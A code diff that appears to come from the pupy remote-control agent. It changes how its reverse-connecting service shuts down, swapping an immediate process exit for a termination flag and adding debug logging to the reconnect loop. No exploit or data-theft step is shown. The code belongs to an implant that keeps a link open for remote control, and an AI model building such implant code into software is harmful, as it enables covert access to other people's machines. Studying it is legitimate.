@@ -428,6 +428,7 @@ class Manager(object):
 setattr(pupy, 'manager', Manager(PStore()))
 setattr(pupy, 'Task', Task)
 setattr(pupy, 'connected', False)
+setattr(sys, 'terminated', False)
 
 def safe_obtain(proxy):
     """ safe version of rpyc's rpyc.utils.classic.obtain, without using pickle. """
@@ -536,10 +537,8 @@ class ReverseSlaveService(Service):
 
 
     def exposed_exit(self):
-        try:
-            return True
-        finally:
-            os._exit(0)
+        sys.terminated = True
+        self._conn.close()
 
     def exposed_register_cleanup(self, method):
         self.exposed_cleanups.append(method)
@@ -761,9 +760,9 @@ def main():
     pupy.infos['native'] = pupy.pseudo == False
     pupy.infos['revision'] = getattr(pupy, 'revision', None)
 
-    exited = False
+    logger.debug('Starting rpyc loop')
 
-    while not exited:
+    while not sys.terminated:
         try:
             rpyc_loop(launcher)
 
@@ -771,13 +770,14 @@ def main():
             print_exception('[ML]')
 
             if type(e) == SystemExit:
-                exited = True
+                sys.terminated = True
 
         finally:
-            if not exited:
+            if not sys.terminated:
                 time.sleep(get_next_wait(attempt))
                 attempt += 1
 
+    logger.debug('Exited')
 
 def rpyc_loop(launcher):
     global attempt
@@ -785,6 +785,14 @@ def rpyc_loop(launcher):
 
     stream = None
     for ret in launcher.iterate():
+        logger.debug('Operation state: Terminated = {}'.format(sys.terminated))
+
+        if sys.terminated:
+            logger.warning('Loop terminated')
+            break
+
+        logger.debug('Acquire launcher: {}'.format(ret))
+
         try:
             pupy.connected = False
             if isinstance(ret, tuple):  # bind payload
@@ -824,6 +832,8 @@ def rpyc_loop(launcher):
             print_exception('[M]')
 
         finally:
+            logger.debug('Launcher completed')
+
             if stream is not None:
                 try:
                     stream.close()
